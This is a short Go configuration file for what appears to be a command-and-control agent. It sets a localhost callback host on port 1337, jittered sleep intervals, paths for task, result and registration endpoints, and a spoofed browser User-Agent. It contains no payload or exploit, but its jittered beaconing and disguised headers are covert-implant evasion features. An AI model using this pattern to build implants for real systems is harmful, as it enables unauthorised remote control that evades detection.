package config

const (
	RemoteHost               = "127.0.0.1"
	RemotePort               = 1337
	SleepTime                = 1.0
	SleepTimeJitter          = 0.5
	AgentType                = "eula_multi"
	TasksUrlPathsJson        = ""
	resultsUrlPathsJson      = ""
	registrationUrlPathsJson = ""
	extraHeadersJson         = ""
)

var (
	TasksUrlPaths        = []string{"/tasks"}
	ResultsUrlPaths      = []string{"/results"}
	RegistrationUrlPaths = []string{"/register"}
	ExtraHeaders         = map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0)"}
)
